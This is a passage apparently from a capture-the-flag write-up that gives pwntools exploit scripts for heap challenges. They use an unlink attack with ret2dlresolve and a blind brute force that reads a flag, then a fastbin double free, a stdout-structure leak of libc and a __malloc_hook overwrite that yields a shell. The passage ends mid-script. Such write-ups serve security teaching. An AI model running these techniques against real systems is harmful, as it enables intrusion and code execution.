            pass
        def ru(x):
            return p.recvuntil(x)
        def se(x):
            p.send(x)
        def sl(x):
            p.sendline(x)
        def new(sz):
            sl('1')
            ru('size?')
            sl(str(sz))
            ru(">> ")
        def delete(idx):
            sl('2')
            ru('index ?')
            sl(str(idx))
            ru(">> ")
        def show(idx):
            sl('3')
            ru('index ?')
            sl(str(idx))
        def edit(idx,content):
            sl('4')
            ru('index ?')
            sl(str(idx))
            ru('content?\n')
            se(content)
            ru(">> ")
        #unlink attack x86
        new(0x68)
        new(0x68)
        new(0x94)
        new(0xf8)
        fake_chunk = p32(0)+p32(0x91)+p32(0x804a070-0xc)+p32(0x804a070-0x8)
        fake_chunk = fake_chunk.ljust(0x90,'\0')
        edit(2,fake_chunk+p32(0x90))
        delete(3)
        #ret2dlresolve and blind injection
        new(0x200)
        bss = 0x0804a500
        edit(2,p32(0x100)+p32(0x804A014)+p32(0x98)+p32(bss+0x300)+p32(0x94)+p32(bss)+p32(0x200))
        edit(1,p32(0x80489FA))
        payload = p32(bss-0x100)+rop.dl_resolve_call(bss+0x60, bss+0x180,0)
        payload += p32(0x8048460)+p32(0x80489F9)+p32(3)+p32(bss+0x300-idx)+p32(idx+1)
        payload += p32(0x080489FB)+p32(bss-0x100)
        payload += p32(0x804893C)
        payload = payload.ljust(0x60,'\x00')
        payload += rop.dl_resolve_data(bss+0x60, 'open')
        payload = payload.ljust(0x180,'\x00')
        payload += 'flag'
        edit(3,payload)
        edit(2,v+'\0')
        sl('2\x00'+'a'*6+p32(0x80488DE))
        ru('index ?\n')
        sl('3\x00')
        ru('>> ')
        show(2)
        ru('\n')
        data = ru('\n') 
        p.close()
        if len(data)>5:
            return False
        return True
    charset ='{}_'+ string.ascii_letters + string.digits + string.punctuation
    flag = ''
    for i in range(40):
        for q in charset:
            if brute_flag(i,q):
                flag+=q
                print(flag)
                if q == '}':
                    exit(0)
                break
## weapon
[docker-enviroment](./docker-enviroment)
this problem have two ways to solve it
> the key to topic is to let a chunk have libc address in fd. and then we use
> a trick to leak a libc address ,finally use fastbin attack to get shell.
#### first
make a fake 0x80(more than that is ok) chunk and free it .so that we can get
libc in fd and then edit the struct of stdout to leak.finally get shell.
    from pwn import *
    def cmd(c):
        p.sendlineafter(">> \n",str(c))
    def Cmd(c):
        p.sendlineafter(">> ",str(c))
    def add(size,idx,name="padding"):
        cmd(1)
        p.sendlineafter(": ",str(size))
        p.sendlineafter(": ",str(idx))
        p.sendafter(":\n",name)
    def free(idx):
        cmd(2)
        p.sendlineafter(":",str(idx))
    def edit(idx,name):
        cmd(3)
        p.sendlineafter(": ",str(idx))
        p.sendafter(":\n",name)
    def Add(size,idx,name="padding"):
        Cmd(1)
        p.sendlineafter(": ",str(size))
        p.sendlineafter(": ",str(idx))
        p.sendafter(":",name)
    def Free(idx):
        Cmd(2)
        p.sendlineafter(":",str(idx))
    #p=process('./pwn')
    p=remote("139.180.216.34",8888)
    #context.log_level='debug'
    add(0x18,0)
    add(0x18,1)
    add(0x60,2,p64(0x0)+p64(0x21)+'\x00'*0x18+p64(0x21)*5)
    add(0x60,3,p64(0x21)*12)
    add(0x60,4)
    add(0x60,5)
    free(0)
    free(1)
    free(0)
    free(1)
    add(0x18,0,"\x50")
    add(0x18,0,'\x00'*8)
    add(0x18,0,"A")
    add(0x18,0,'GET')
    edit(2,p64(0x0)+p64(0x91))
    free(0)
    add(0x18,0)
    add(0x60,0,'\xdd\x25')
    free(2)
    free(5)
    free(2)
    free(5)
    #gdb.attach(p,'')
    add(0x60,4,'\x70')
    #
    add(0x60,0)
    add(0x60,0)
    add(0x60,0)
    add(0x60,0,'\x00'*(0x40+3-0x10)+p64(0x1800)+'\x00'*0x19)
    p.read(0x40)
    base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd2600-0x7ffff7a0d000)
    log.warning(hex(base))
    #raw_input()
    libc=ELF("./pwn").libc
    Add(0x60,0)
    Add(0x60,1)
    Add(0x18,2)
    Free(0)
    Free(1)
    Free(0)
    Add(0x60,0,p64(libc.sym['__malloc_hook']+base-35))
    Add(0x60,0)
    Add(0x60,0)
    one=0xf02a4
    Add(0x60,0,'\x00'*19+p64(one+base))
    Free(1)
    Free(1)
    p.interactive()
#### second
when we use scanf to input something .if you input lots of things ,it will
malloc a 0x400 chunk to keep it temporarilyã€‚if we keep some fastbin when it
malloc.it will be put into smallbin.now we also have libc address.
    from pwn import *
    context.log_level = "debug"
    #p = process("./weapon")
    p = remote("139.180.216.34",8888)
    elf = ELF("./weapon")
    a = elf.libc
    #gdb.attach(p)
    def create(idx,size,content):
        p.recvuntil(">> \n")
        p.sendline(str(1))
        p.recvuntil("weapon: ")
        p.sendline(str(size))
        p.recvuntil("index: ")
        p.sendline(str(idx))
        p.recvuntil("name:")